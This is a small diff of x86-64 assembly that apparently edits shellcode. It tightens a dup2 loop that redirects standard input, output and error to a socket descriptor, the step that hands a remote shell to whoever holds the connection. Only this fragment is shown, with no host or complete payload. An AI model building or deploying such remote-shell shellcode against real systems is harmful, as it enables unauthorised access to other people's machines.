@@ -80,14 +80,10 @@ _start:
 
 
 	; (sockfd, {2,1,0})
-	; xchg rdi, rax
 	push 0x3
 	pop rcx
-	; inc rcx
 dup2loop:
-	dec rcx
-	push rdx
-	pop rax
+	dec cl
 	mov al, 33
 	push rcx
 	pop rsi
